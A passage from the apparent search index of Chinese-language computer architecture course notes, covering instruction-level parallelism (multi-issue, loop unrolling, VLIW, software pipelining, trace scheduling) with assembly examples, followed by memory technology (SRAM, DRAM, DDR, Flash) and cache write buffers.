\u53d1\u5c04\u6765\u8bf4\uff0c\u6bd4\u8f83\u7684\u6b21\u6570\u4e3a \\(O(N^2-N)\\)\u3002\u5982\u679c\u4e00\u4e2a Cycle \u4e0d\u80fd\u5b8c\u6210 issue check\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u8981\u8003\u8651\u589e\u5927 clock cycle time \u4e86\u3002</p> <p>\u66f4\u9ad8\u7684\u53d1\u5c04\u7387\u4e5f\u4f1a\u5bfc\u81f4\u66f4\u9ad8\u7684\u5206\u652f\u9884\u6d4b\u635f\u5931\uff0c\u56e0\u6b64\u591a\u53d1\u5c04\u4e5f\u9700\u8981\u63d0\u9ad8\u5206\u652f\u9884\u6d4b\u51c6\u786e\u7387</p> <p>\u5916\u52a0\u786c\u4ef6\u5c42\u9762\u7684\u9759\u6001\u591a\u53d1\u5c04\u8fd8\u9700\u8981\u76f8\u5e94\u589e\u52a0\u5bc4\u5b58\u5668\u8bfb\u5199\u53e3\u3001result buses\u3001forwarding paths\u7b49\uff0c\u56e0\u6b64\u5b9e\u9645\u4e0a\u5f88\u5c11\u6709\u5382\u5bb6\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\u591a\u53d1\u5c04\u4e86\u3002</p> <p>Dynamic Superscaler</p> <p>\u52a8\u6001\u8c03\u5ea6\u7684 Superscalar \u901a\u8fc7\u5982\u4e0b\u4e24\u79cd\u6280\u672f\u6765\u4fdd\u8bc1\u4e00\u4e2a\u65f6\u949f\u5468\u671f\u53ef\u4ee5\u5b8c\u6210\u4e00\u6b21 issue check\uff1a</p> <ul> <li>pipeline\uff1a\u5c06issue\u68c0\u67e5\u6d41\u6c34\u5316\uff0c\u4f8b\u5982\u4e00\u6761\u6307\u4ee4\u7684\u68c0\u67e5\u5728\u534a\u4e2a\u65f6\u949f\u5468\u671f\u5b8c\u6210\uff0c\u4e24\u6761\u6307\u4ee4\u7684\u68c0\u67e5\u5c31\u53ef\u4ee5\u5728\u4e00\u4e2a\u65f6\u949f\u5468\u671f\u5b8c\u6210</li> <li>widen issue logic\uff1a\u5c06issue\u68c0\u67e5\u903b\u8f91\u5bbd\u5ea6\u589e\u5927\uff0c\u4f7f\u5f97\u4e00\u6b21\u80fd\u68c0\u67e5\u591a\u4e2a\u6307\u4ee4</li> </ul> <p>\u5047\u5b9a\u6211\u4eec\u73b0\u5728\u6709 1 mem unit\uff0c1 integer unit\uff0c1 FP unit\uff0c\u8981\u6267\u884c\u4ee5\u4e0b\u5faa\u73af\uff1a</p> <pre><code>loop:\n    L.D.    F0, 0(R1)\n    ADD.D   F4, F0, F2\n    S.D     F4, 0(R1)\n    SUBU    R1, R1, #8\n    BNEZ    R1, loop\n</code></pre> <p>\u91c7\u53d6\u53cc\u53d1\u5c04\uff0c\u6ce8\u610f branch \u6307\u4ee4\u53ea\u80fd\u5355\u72ec\u53d1\u5c04\uff1a</p> <p></p> <ul> <li>\u6b64\u5904\u6307\u4ee4 1 \u548c 2\u30014 \u548c 5\u30016 \u548c 7 \u4e4b\u95f4\u6709\u6570\u636e\u4f9d\u8d56\uff0c\u56e0\u6b64\u9700\u8981\u7b49\u5f85\u524d\u4e00\u6761\u6307\u4ee4\u5199\u56de CDB</li> <li>\u6307\u4ee4 3 \u548c 4\u30016 \u548c 8\u30018 \u548c 9 \u4e4b\u95f4\u53d1\u751f\u7ed3\u6784\u51b2\u7a81\uff0c\u56e0\u6b64\uff0c\u56e0\u6b64\u4e0d\u80fd\u4e0d\u80fd\u540c\u65f6\u8fdb\u5165 FU \u6267\u884c</li> </ul> <p>\u6ce8\u610f\u5230\u53ef\u4ee5\u5c06\u5730\u5740\u8ba1\u7b97\u5355\u72ec\u4ece integer unit \u4e2d\u5206\u79bb\u51fa\u6765\uff0c\u5373\u4e0d\u8d70\u6574\u6570\u52a0\u6cd5\uff0c\u8fd9\u6837\u53ef\u4ee5\u89e3\u51b3\u4e0a\u9762\u7684\u7ed3\u6784\u51b2\u7a81\uff1a</p> <p></p> <p>\u770b\u5230\u6709\u4e9b\u6307\u4ee4\u540c\u65f6\u5199\u56de\u4e86\uff0c\u5982\u679c\u786c\u4ef6\u4e0a\u4e0d\u652f\u6301\u4e24\u6761 write CDB \u7684\u8bdd\uff0c\u53ef\u4ee5\u5c06\u5199\u56de\u65f6\u95f4\u9519\u5f00</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u5047\u8bbe ALU\u3001Load/Store\u3001Branch \u5206\u522b\u4f7f\u7528\u72ec\u7acb\u7684 integer unit\uff0c\u6839\u636e\u4ee5\u4e0b\u4f8b\u5b50\u6765\u89c2\u5bdf\u5e26\u6709 Speculation \u7684\u591a\u53d1\u5c04\u600e\u4e48\u5904\u7406\uff1a</p> <pre><code>loop:\n    LD     R2, 0(R1)\n    ADDI   R2, R2, #1\n    SD     R2. 0(R1)\n    ADDI   R1, R1, #4\n    BNE    R2, R3, loop\n</code></pre> <p>\u5728\u6ca1\u6709\u4f7f\u7528 Speculation \u65f6\uff0cbranch \u540e\u9762\u7684\u6307\u4ee4\u867d\u7136\u53ef\u4ee5\u5148\u53d1\u5c04\uff0c\u4f46\u662f\u53ea\u6709\u5f53\u5206\u652f\u786e\u5b9a\u540e\u624d\u80fd\u6267\u884c\uff0c\u8fd0\u884c\u60c5\u51b5\u5982\u4e0b\uff1a</p> <p></p> <p>\u90a3\u4e48\u63a5\u4e0b\u6765\u6211\u4eec\u5047\u8bbe\u9884\u6d4b\u4e0d\u8df3\u8f6c\uff0c\u540e\u9762\u7684\u6307\u4ee4\u53ef\u4ee5\u63d0\u524d\u6267\u884c\uff1a</p> <p></p> <p>\u65e2\u7136\u4e71\u5e8f\u6267\u884c\u4e86\uff0c\u8bb0\u5f97\u8981\u987a\u5e8f\u63d0\u4ea4</p>"},{"location":"Courses/CA/ILP/#_2","title":"\u8f6f\u4ef6\u65b9\u6cd5","text":"<ul> <li>\u7f16\u8bd1\u5668\u4f18\u5316<ul> <li>\u5faa\u73af\u5c55\u5f00</li> <li>\u8f6f\u4ef6\u6d41\u6c34\u7ebf</li> <li>\u5168\u5c40\u4ee3\u7801\u8c03\u5ea6</li> </ul> </li> <li>\u9759\u6001\u5206\u652f\u9884\u6d4b</li> <li>\u9759\u6001\u591a\u53d1\u5c04\uff1aVLIW</li> </ul>"},{"location":"Courses/CA/ILP/#loop-unrolling","title":"Loop Unrolling","text":"<p>\u6b64\u5904\u6211\u4eec\u7ed9\u51fa\u4e24\u6761\u5b58\u5728\u6570\u636e\u4f9d\u8d56\u7684\u6d6e\u70b9\u76f8\u5173\u6307\u4ee4\u4e4b\u95f4\u6240\u9700\u8981\u63d2\u5165\u7684 Stall (\u6216 Bubble)\uff1a</p> Pre Post Latency (cycle) FP ALU op FP ALU op 3 FP ALU op Store 2 Load FP ALU op 1 Load Store 0 <p>\u7531\u4e8e\u91c7\u7528\u4e86 Bypassing \u7b56\u7565\uff0c<code>MEM</code> \u9636\u6bb5\u7684\u8f93\u51fa\u53ef\u4ee5\u76f4\u63a5\u4f5c\u4e3a <code>MEM</code> \u9636\u6bb5\u7684\u8f93\u5165\uff0c\u6240\u4ee5 <code>fld</code> \u548c <code>fsd</code> \u4e4b\u95f4\u65e0\u5ef6\u8fdf</p> <p>\u5047\u5b9a\u6211\u4eec\u6709\u4e00\u4ee3\u7801\u6bb5\uff1a</p> <pre><code>for (i = 999; i &gt;= 0; i--)\n    x[i] = x[i] + s;\n</code></pre> <p>\u5176\u4f5c\u4e3a RISC-V \u6c47\u7f16\u8bed\u8a00\u7684\u8868\u793a\u5982\u4e0b\uff1a</p> <pre><code>loop:\n    fld    f0, 0(x1)   # f0 = x[i]\n    fadd.d f4, f0, f2  # f2 = s, f4 = x[i] + s\n    fsd    f4, 0(x1)   # x[i] = f4\n    addi   x1, x1, -8  # size(double) = 8 Bytes\n    bne    x1, x2, loop\n</code></pre> <p>\u5728\u4e0d\u8fdb\u884c Pipeline Scheduling \u7684\u60c5\u51b5\u4e0b\uff0c\u4e00\u8f6e\u5faa\u73af\u9700\u8981 Stall 3 \u6b21\uff1b\u5982\u679c\u6211\u4eec\u5c06\u4e0e\u5176\u5b83\u6307\u4ee4\u65e0\u6570\u636e\u4f9d\u8d56\u7684 <code>addi x1, x1, -8</code> \u79fb\u52a8\u5230\u7b2c\u4e00\u4e2a Stall \u5904\uff0c\u5219\u6574\u8f6e\u5faa\u73af\u53d8\u4e3a\u82b1\u8d39 7 \u4e2a\u65f6\u949f\u5468\u671f\uff1a</p> <p></p> <p>\u540c\u65f6\u4e0b\u9762\u8fd9\u6761 <code>fsd</code> \u6307\u4ee4\u5bf9\u5e94\u66f4\u6539\u4e3a <code>fsd f4, 8(x1)</code></p> <p>\u5728\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6bcf 7 \u4e2a\u65f6\u949f\u5468\u671f\u5b8c\u6210\u4e00\u8f6e\u5faa\u73af\u8fed\u4ee3\u3002\u4f46\u5bf9\u6570\u7ec4\u5143\u7d20\u8fdb\u884c\u5b9e\u9645\u64cd\u4f5c\u7684\u6307\u4ee4\u53ea\u5360\u4e86 3 \u4e2a\u65f6\u949f\u5468\u671f\uff0c\u5176\u4f59 4 \u4e2a\u65f6\u949f\u5468\u671f\u5305\u62ec\u4e24\u6b21 Stall \u548c\u5faa\u73af\u5f00\u9500\uff08<code>addi</code> \u548c <code>bne</code>)\u3002\u6211\u4eec\u5e0c\u671b\u6d88\u9664\u8fd9 4 \u4e2a\u65f6\u949f\u5468\u671f\u3002</p> <p>\u4e00\u4e2a\u7b80\u5355\u65b9\u6848\u662f\u5faa\u73af\u5c55\u5f00 Loop Unrolling\uff0c\u5b83\u5c06\u5faa\u73af\u4f53\u590d\u5236\u591a\u6b21\uff0c\u540c\u65f6\u8c03\u6574\u5faa\u73af\u7ec8\u6b62\u7684\u4ee3\u7801\u3002\u5faa\u73af\u5c55\u5f00\u4e0d\u4ec5\u6d88\u9664\u4e86\u5206\u652f\uff0c\u8fd8\u5c06\u6d41\u6c34\u7ebf\u8c03\u5ea6\u7684\u8c03\u63a7\u8303\u56f4\u4ece\u4e00\u6b21\u5faa\u73af\u4f53\u589e\u52a0\u5230\u4e86\u6765\u81ea\u591a\u4e2a\u4e0d\u540c\u8fed\u4ee3\u7684\u6307\u4ee4\u3002</p> <p>\u5bf9\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\u8fdb\u884c\u5faa\u73af\u5c55\u5f00\uff0c\u5220\u9664\u5197\u4f59\u7684 <code>addi</code> \u548c <code>bne</code> \u8ba1\u7b97\uff0c\u5e76\u5229\u7528\u201c\u5bc4\u5b58\u5668\u91cd\u547d\u540d\u201d\u6765\u8fdb\u884c\u6709\u6548\u7684\u8c03\u5ea6\uff1a</p> <p></p> <p>\u5faa\u73af\u5c55\u5f00\u5728\u6bcf\u6b21\u5faa\u73af\u7684\u8fed\u4ee3\u90fd\u662f\u72ec\u7acb\u65f6\u6700\u6709\u6548\uff0c\u5373\u6ca1\u6709 loop-carried dependency\u3002\u5b83\u901a\u5e38\u5728\u5b9e\u9645\u7f16\u8bd1\u524d\u5c31\u5df2\u5b8c\u6210\uff0c\u4ece\u800c\u6d88\u9664\u5197\u4f59\u7684\u8ba1\u7b97\u3002</p>"},{"location":"Courses/CA/ILP/#static-branch-prediction","title":"Static Branch Prediction","text":"<p>\u7f16\u8bd1\u5668\u7f16\u8bd1\u65f6\uff0c\u53ef\u4ee5\u6839\u636e\u6761\u4ef6\u8df3\u8f6c\u7684\u65b9\u5411\u6765\u9884\u6d4b\u662f\u5426 taken\uff1a</p> <ul> <li>\u4f8b\u5982\u5bf9\u4e8e <code>loop</code> \u7c7b\u578b\uff0c\u9884\u6d4b\u8df3\u8f6c</li> <li>\u5bf9\u4e8e <code>if</code> \u7c7b\u578b\uff0c\u9884\u6d4b\u4e0d\u8df3\u8f6c</li> </ul> <p>\u8fd8\u53ef\u4ee5\u6839\u636e\u524d\u51e0\u6b21\u8fd0\u884c\u7ed3\u679c\u7684 profile.out \u6765\u9884\u6d4b\u3002</p>"},{"location":"Courses/CA/ILP/#multi-issue-vliw","title":"Multi Issue: VLIW","text":"<p>VLIW \u9009\u62e9\u9898\u4f1a\u8003\uff0c\u6ce8\u610f\u8fd9\u4e5f\u662f\u591a\u53d1\u5c04\u7684\u4e00\u79cd\uff0c\u5373\u53ef\u4ee5\u5c06 CPI \u964d\u81f3 1 \u4ee5\u4e0b</p> <p>Very Long Instruction Word \u901a\u8fc7\u7f16\u8bd1\u5668\u5c06\u51e0\u4e2a\u6307\u4ee4\u6253\u5305\u6210\u4e00\u4e2a\u957f\u6307\u4ee4\uff0c\u5b83\u786e\u4fdd\u4e00\u4e2a\u957f\u6307\u4ee4\u4e2d\u5404\u4e2a\u6307\u4ee4\u4e4b\u95f4\u90fd\u662f\u72ec\u7acb\u7684\uff0c\u4ece\u800c\u53ef\u4ee5\u5e76\u884c\u6267\u884c\u3002</p> <p></p> <ul> <li>\u6280\u672f\u95ee\u9898<ul> <li>\u5982\u679c\u627e\u4e0d\u5230\u8db3\u591f\u591a\u7684\u72ec\u7acb\u6307\u4ee4\uff0c\u5219\u5f88\u591a\u529f\u80fd\u5355\u5143\u95f2\u7f6e</li> <li>\u67d0\u4e2a\u529f\u80fd\u5355\u5143\u88ab Stall \u4e86\uff0c\u5219\u5f71\u54cd\u6574\u4e2a\u957f\u6307\u4ee4\u7684\u5ef6\u8fdf</li> </ul> </li> <li>\u517c\u5bb9\u6027\u95ee\u9898<ul> <li>\u9700\u8981\u5bf9\u4e0d\u540c\u786c\u4ef6\u6216\u4e0d\u540c\u6307\u4ee4\u96c6\u8c03\u6574</li> </ul> </li> </ul> <pre><code>for ( ... )\n    x[i] += s;\n</code></pre> <p>VLIW \u5305\u542b\u591a\u4e2a\u69fd\u4f4d slot\uff0c\u6bcf\u4e2a\u69fd\u5bf9\u5e94\u4e00\u4e2a\u529f\u80fd\u5355\u5143\u3002\u5047\u5b9a\u6211\u4eec\u6709\u4e00\u4e2a\u5177\u6709 2 \u4e2a\u8bbf\u5b58\u8fd0\u7b97\u3001 2 \u4e2a\u6d6e\u70b9\u8fd0\u7b97\u3001 1 \u4e2a\u6574\u6570\u8fd0\u7b97\u7684 VLIW \u5904\u7406\u5668\uff0c\u5c1d\u8bd5\u5bf9\u5982\u4e0a\u7b80\u5355\u5faa\u73af\u8fdb\u884c\u5c55\u5f00\u5e76\u8fdb\u884c\u591a\u53d1\u5c04\uff1a</p> <p></p>"},{"location":"Courses/CA/ILP/#_3","title":"\u9ad8\u7ea7\u7f16\u8bd1\u5668\u4f18\u5316\u6280\u672f","text":""},{"location":"Courses/CA/ILP/#software-pipeline","title":"Software Pipeline","text":"<pre><code>loop:\n1:    LD     F0, 0(R1)\n2:    ADD    F4, F0, F2\n3:    SD     0(R1), F4\n4:    SUBI   R1, R1, 4\n5:    BNEZ   R1, loop\n</code></pre> <p>\u4e0a\u8ff0\u6c47\u7f16\u4ee3\u7801\u4e2d\uff0c\u6307\u4ee4 2,3,4 \u4e4b\u95f4\u5b58\u5728\u6570\u636e\u4f9d\u8d56\uff0c\u4f46\u662f\u5982\u679c\u8fdb\u884c\u5faa\u73af\u5c55\u5f00\u540e\u4e0b\u9762\u7684\u6307\u4ee4 3,5,7 \u4e4b\u95f4\u65e0\u6570\u636e\u4f9d\u8d56\uff0c\u5b83\u4eec\u4e4b\u95f4\u4e5f\u4e0d\u9700\u8981\u4efb\u4f55 Stall\uff1a</p> <p></p> <p>\u8fd9\u4e09\u4e2a\u6307\u4ee4\u91cd\u65b0\u548c\u63a7\u5236\u5faa\u73af\u7684 <code>SUBI</code> \u548c <code>BNEZ</code> \u7ec4\u88c5\u540e\uff0c\u53ef\u4ee5\u6784\u6210\u4e00\u4e2a\u53ea\u6709 Start \u548c End \u65f6\u5b58\u5728 Stall\uff0c\u4e2d\u95f4\u4e0d\u4f1a\u505c\u987f\u7684\u6d41\u6c34\u7ebf\uff1a</p> <p></p>"},{"location":"Courses/CA/ILP/#_4","title":"\u5168\u5c40\u4ee3\u7801\u8c03\u5ea6","text":"<p>\u5168\u5c40\u4ee3\u7801\u8c03\u5ea6\u80fd\u591f\u8de8 branch \u79fb\u52a8\u6307\u4ee4\uff0c\u4e00\u79cd\u5e38\u89c1\u7684\u6280\u672f\u662f Trace Scheduling\uff0c\u5b83\u5206\u4e3a\u4e24\u6b65\uff1a</p> <ul> <li>&lt;1&gt; Trace Selection: \u5bfb\u627e\u4e00\u6761 Basic Blocks \u7684\u4e32\u8054\u6267\u884c\u8def\u5f84</li> <li>&lt;2&gt; Trace Compaction: \u5c06 Trace \u6253\u5305\u6210\u51e0\u4e2a VLIW \u6307\u4ee4</li> </ul> <p>Trace Scheduling \u662f\u57fa\u4e8e\u7f16\u8bd1\u5668\u7684 Speculation</p> <p></p>"},{"location":"Courses/CA/Memory%20Hierarchy%20Design/","title":"Memory Hierarchy Design","text":""},{"location":"Courses/CA/Memory%20Hierarchy%20Design/#memory-hierarchy-design-basics","title":"Memory Hierarchy Design Basics","text":"<p> \u7ea6 3419 \u4e2a\u5b57  3 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 17 \u5206\u949f</p> <p>\u7b2c\u4e8c\u7ae0\u7684\u91cd\u70b9\u662f Cache\uff0c\u5e76\u4e14\u5728\u8003\u8bd5\u4e2d\u57fa\u672c\u4ee5\u9009\u62e9\u9898\u5f62\u5f0f\u51fa\u73b0</p> <p></p> <p>\u4e0e\u8ba1\u7ec4\u91cd\u5408\u7684\u90e8\u5206\u81ea\u7136\u7565\u8fc7\u4e86</p>"},{"location":"Courses/CA/Memory%20Hierarchy%20Design/#memory-technology-optimization","title":"Memory Technology &amp; Optimization","text":"<p>SRAM</p> <p>\u76f8\u6bd4\u4e8e DRAM\uff0cSRAM \u4e0d\u9700\u8981\u5237\u65b0\u6765\u7ef4\u6301\u6570\u636e\uff0c\u5176\u53ea\u9700\u8981\u5f88\u5c11\u7684\u529f\u8017\u6765\u7ef4\u6301\u7535\u8377\u3002SRAM \u901a\u5e38\u4f7f\u7528 6 \u4e2a\u6676\u4f53\u7ba1\u6765\u4fdd\u5b58\u4e00\u4f4d\u6570\u636e\u3002</p> <p>\u73b0\u5728\u5904\u7406\u5668\u82af\u7247\u4e0a\u4e00\u822c\u90fd\u4f1a\u96c6\u6210\u591a\u7ea7 SRAM \u7f13\u5b58\u3002\u5927\u578b L3 Cache \u7684\u8bbf\u95ee\u65f6\u95f4\u901a\u5e38\u662f L2 Cache \u7684 2~8 \u500d\uff0c\u5c3d\u7ba1\u5982\u6b64\uff0cL3 Cache \u7684\u8bbf\u95ee\u65f6\u95f4\u901a\u5e38\u4e5f\u6bd4 DRAM \u5feb 5 \u500d\u3002</p> <p>DRAM</p> <p>DRAM \u901a\u5e38\u7528\u4e8e Main Memory\uff0c\u5176\u5185\u90e8\u57fa\u672c\u7ed3\u6784\u5982\u4e0b\u56fe\uff1a</p> <p></p> <p>\u5904\u4e8e\u5c01\u88c5\u6280\u672f\u548c\u6210\u672c\u7684\u539f\u56e0\uff0cDRAM \u9009\u62e9\u590d\u7528\u5730\u5740\u7ebf\u7684\u65b9\u5f0f\u6765\u51cf\u5c11\u7ba1\u811a\u6570\u91cf\u3002\u5bfb\u627e\u5730\u5740\u5206\u4e3a\u4e24\u4e2a\u9636\u6bb5\uff0c\u5206\u522b\u4e3a Row Access Strobe(RAS) \u548c Column Access Strobe(CAS)\u3002\u5728 RAS \u9636\u6bb5\u4f20\u9001\u4e00\u534a\u5730\u5740\uff0c\u53d6\u51fa\u5bf9\u5e94\u7684 ROW \u8f7d\u5165\u884c\u7f13\u51b2\u533a\uff1b\u5728 CAS \u9636\u6bb5\u4f20\u9001\u53e6\u4e00\u534a\u5730\u5740\uff0c\u8fdb\u884c\u6570\u636e\u7684\u8bfb\u5199\u64cd\u4f5c\u3002</p> <p>DRAM \u4f7f\u7528\u4e00\u4e2a\u6676\u4f53\u7ba1(\u5176\u5b9e\u662f\u7535\u5bb9\u5668)\u6765\u5b58\u50a8\u4e00\u4f4d\u6570\u636e\u3002\u76f8\u6bd4\u4e8e SRAM \u4f7f\u7528\u516d\u4e2a\u6676\u4f53\u7ba1\u5b58\u50a8\u4e00\u4f4d\u6570\u636e\uff0cDRAM \u66f4\u6613\u83b7\u5f97\u66f4\u5927\u7684\u5bb9\u91cf\u3002</p> <p>\u4e3a\u4e86\u9632\u6b62\u7535\u5bb9\u5668\u7684\u7535\u8377\u6d41\u5931\u5bfc\u81f4\u6570\u636e\u4e22\u5931\uff0c\u5fc5\u987b\u5b9a\u671f\u201c\u5237\u65b0\u201d\u6240\u6709\u4f4d\u3002\u5b58\u50a8\u5668\u7cfb\u7edf\u4e2d\uff0cDRAM \u5fc5\u987b\u5728\u4e00\u6bb5\u65f6\u95f4\u5185\u8fdb\u884c\u5237\u65b0\uff0c\u5177\u4f53\u64cd\u4f5c\u4e3a\u5bf9\u6bcf\u4e00\u4e2a ROW \u8fdb\u884c\u8bfb\u53d6\u518d\u5199\u56de\u539f\u4f4d\u7f6e\u3002</p> <p>\u5237\u65b0\u4f7f\u5f97\u5b58\u50a8\u5668\u7cfb\u7edf\u5076\u5c14\u4e0d\u53ef\u7528\uff0c\u8bbe\u8ba1\u4eba\u5458\u5c3d\u53ef\u80fd\u5c06\u5237\u65b0\u65f6\u95f4\u4fdd\u6301\u5728\u603b\u65f6\u95f4 5% \u4ee5\u4e0b</p> <p>SDRAM</p> <p>\u975e\u5e38\u65e9\u671f\u7684 DRAM \u6709\u4e00\u4e2a\u7f13\u51b2\u533a\uff0c\u7528\u6765\u5b9e\u73b0\u5bf9\u4e00\u4e2a ROW \u8fdb\u884c\u591a\u6b21 Column Access\uff0c\u800c\u4e0d\u7528\u6bcf\u6b21\u90fd\u91cd\u542f ROW Access\u3002\u4f46\u662f\u6b64\u7b56\u7565\u7684\u63a5\u53e3\u662f\u5f02\u6b65\u7684\uff0c\u8fd9\u8981\u6c42\u6bcf\u6b21 Column Access \u65f6\u90fd\u8981\u6d88\u8017\u989d\u5916\u65f6\u95f4\u4e0e\u63a7\u5236\u5668\u540c\u6b65\u3002</p> <p>20\u4e16\u7eaa90\u5e74\u4ee3\u4e2d\u671f\uff0cDRAM \u63a5\u53e3\u4e2d\u589e\u52a0\u4e86\u4e00\u4e2a\u65f6\u949f\u4fe1\u53f7\u6765\u6d88\u53bb\u540c\u6b65\u65f6\u95f4\u7684\u5f71\u54cd\uff0c\u5373 Synchronous DRAM(SDRAM) \u3002</p> <p>\u73b0\u4ee3 SDRAM \u652f\u6301\u65ad\u7535\u6a21\u5f0f\uff0c\u5373\u624b\u52a8\u5173\u95ed\u65f6\u949f\u3002\u65f6\u949f\u53ea\u7528\u4e8e\u8fdb\u884c\u81ea\u52a8\u5237\u65b0</p> <p>21\u4e16\u7eaa\u65e9\u671f\u63a8\u51fa\u4e86\u4e00\u9879\u65b0\u7684\u521b\u65b0\uff0c\u5373 Double Date Rate, DDR\u3002\u5b83\u80fd\u591f\u8ba9 DRAM \u5728\u65f6\u949f\u5468\u671f\u4e0a\u8fb9\u6cbf\u548c\u4e0b\u8fb9\u6cbf\u90fd\u80fd\u4f20\u8f93\u6570\u636e\uff0c\u4ece\u800c\u4f7f\u5f97\u5cf0\u503c\u6570\u636e\u4f20\u8f93\u7387\u7ffb\u500d\u3002</p> <p>\u6700\u540e\uff0cSDRAM \u5f15\u5165\u4e86 Bank \u6765\u51cf\u5c11\u529f\u8017\u3001\u7f29\u77ed\u8bbf\u95ee\u65f6\u95f4\u3002\u5904\u7406\u5668\u53ef\u4ee5\u540c\u65f6\u8bbf\u95ee\u591a\u4e2a\u4e0d\u540c\u7684 Bank\u3002</p> <p>\u5728\u8fd9\u79cd\u6280\u672f\u4e0b\uff0c\u5730\u5740\u5c06\u88ab\u8bd1\u7801\u4e3a Bank Number\uff0cRow Address\uff0cColumn Address</p> <p>Graphics Data RAMs</p> <p>GDRAM \u662f\u4e00\u79cd\u7279\u6b8a\u7684 RAM\uff0c\u5b83\u4ee5 SDRAM \u4e3a\u8bbe\u8ba1\u57fa\u7840\uff0c\u4e3a GPU \u7684\u9ad8\u5e26\u5bbd\u9700\u6c42\u8fdb\u884c\u5b9a\u5236\u3002GDDR \u548c DDR \u7684\u5177\u4f53\u533a\u522b\u6709\uff1a</p> <ul> <li>&lt;1&gt; GDDR \u7684\u63a5\u53e3\u66f4\u5bbd</li> <li>&lt;2&gt; GDDR \u6570\u636e\u7ba1\u811a\u7684\u6700\u5927\u65f6\u949f\u9891\u7387\u66f4\u9ad8\uff0c\u5e76\u4e14 GDRAM \u901a\u5e38\u4e0e GPU \u76f4\u63a5\u76f8\u8fde\uff0c\u710a\u63a5\u5728\u7535\u8def\u677f\u4e0a<ul> <li>DRAM \u5219\u901a\u5e38\u653e\u7f6e\u4e8e\u53ef\u6269\u5c55\u7684 DIMM \u9635\u5217\u4e2d</li> </ul> </li> </ul> <p>Flash</p> <p>Flash Memory \u662f\u4e00\u79cd Electronically Erasable Programmable Read-Only Memory\uff0c\u5b83\u901a\u5e38\u53ea\u8bfb\u3001\u53ef\u64e6\u9664\uff0c\u5e76\u4e14\u65ad\u7535\u4e0d\u4f1a\u4e22\u5931\u5185\u5bb9\u3002</p> <p>\u53ea\u8bfb\u548c\u53ef\u64e6\u9664\u5e76\u4e0d\u77db\u76fe\uff0c\u53ea\u8bfb\u6307\u8bfb\u53d6\u65f6\u5185\u5bb9\u4e0d\u4f1a\u88ab\u4fee\u6539\uff0c\u4f46\u662f\u4ecd\u7136\u53ef\u4ee5\u5728\u7279\u5b9a\u6761\u4ef6\u4e0b\u64e6\u9664\u6570\u636e\u91cd\u5199</p> <p>\u95ea\u5b58\u4e0e\u6807\u51c6 DRAM \u4f53\u7cfb\u7ed3\u6784\u5dee\u5f02\u8f83\u5927\uff0c\u4e3b\u8981\u6709\uff1a</p> <ul> <li>&lt;1&gt; \u95ea\u5b58\u8bfb\u53d6\u987a\u5e8f\u8fdb\u884c\uff0c\u5e76\u4e14\u4f1a\u8bfb\u53d6\u6574\u4e2a Page<ul> <li>1 \u4e2a Page \u53ef\u80fd\u662f 512 Bytes\u30012KiB\u751a\u81f3\u66f4\u5927</li> <li>\u56e0\u6b64\u95ea\u5b58\u901f\u5ea6\u8fdc\u5c0f\u4e8e DRAM\uff0c\u4f46\u4ecd\u7136\u6bd4\u78c1\u76d8\u5feb 300~500 \u500d</li> </ul> </li> <li>&lt;2&gt; \u91cd\u5199\u95ea\u5b58\u524d\uff0c\u5fc5\u987b\u64e6\u9664\u8be5\u5904\u7684\u6570\u636e<ul> <li>\u64e6\u9664\u4ecd\u7136\u4ee5 Page \u4e3a\u5355\u4f4d\uff0c\u56e0\u6b64\u5199\u5165\u65f6\u8981\u5c06\u539f\u6765\u7684\u6570\u636e\u548c\u6211\u4eec\u60f3\u8981\u5199\u5165\u7684\u6570\u636e\u7ec4\u88c5\u8d77\u6765</li> </ul> </li> <li>&lt;3&gt; \u95ea\u5b58\u662f\u975e\u6613\u5931\u6027\u7684\uff0c\u672a\u8fdb\u884c\u8bfb\u5199\u65f6\u529f\u8017\u975e\u5e38\u4f4e</li> <li>&lt;4&gt; \u9ad8\u5bc6\u5ea6\u95ea\u5b58\u6bd4 SDRAM \u4fbf\u5b9c</li> </ul> <p>\u73b0\u4ee3 PMD \u548c\u7b14\u8bb0\u672c\u7535\u8111\u591a\u4f7f\u7528\u56fa\u6001\u786c\u76d8\uff0c\u57fa\u4e8e Flash \u7684\u5b58\u50a8\u5e38\u7528\u5728\u53f0\u5f0f\u673a\u6216\u5927\u578b\u670d\u52a1\u5668\u4e0a\u3002</p>"},{"location":"Courses/CA/Memory%20Hierarchy%20Design/#cache","title":"Cache \u76f8\u5173\u6982\u5ff5\u8865\u5145","text":""},{"location":"Courses/CA/Memory%20Hierarchy%20Design/#write-buffer","title":"Write Buffer","text":"<p>\u5373\u4fbf\u7528\u4e86 Cache\uff0c\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u4e0d\u53ef\u907f\u514d\u7684\u4f1a\u8bbf\u95ee\u5185\u5b58\u3002\u6b64\u65f6\u5c31\u4f1a\u53d1\u751f Write Stall\uff0c\u7a0b\u5e8f\u5fc5\u987b\u7b49\u5f85 CPU \u5199\u56de\u5185\u5b58\u7ed3\u675f\u3002</p> <p>\u4e3a\u4e86\u51cf\u5c11 Write Stall\uff0c\u6211\u4eec\u5f15\u5165 Write Buffer \u4f5c\u4e3a\u7f13\u51b2\u533a\u3002\u5b83\u53ef\u4ee5\u4e34\u65f6\u4fdd\u5b58\u9700\u8981\u5199\u56de\u4e3b\u5b58\u7684 Cache \u6570\u636e\uff0c\u7b49\u5230 CPU \u7a7a\u95f2\u65f6\u518d\u8fdb\u884c\u5199\u56de\u64cd\u4f5c\u3002</p> <p>\u7531\u4e8e Buffer \u5927\u5c0f\u6709\u9650\uff0c\u56e0\u6b64\u4e5f\u4e0d\u80fd\u5b8c\u5168\u907f\u514d Write Stall \u53d1\u751f\u3002</p> <p>\u5bf9\u4e8e\u591a\u7ea7\u7f13\u5b58\uff0cWrite Buffer \u4e00\u822c\u4f4d\u4e8e L1 Cache \u548c L2 Cache \u4e4b\u95f4\u3002</p>"},{"location":"Courses/CA/Memory%20Hierarchy%20Design/#_1","title":"\u7edf\u4e00\u7f13\u5b58\u548c\u5206\u79bb\u7f13\u5b58","text":"Unified CacheSplit Cache <ul> <li>\u6307\u4ee4\u548c\u6570\u636e\u5171\u7528\u4e00\u4e2a cache</li> 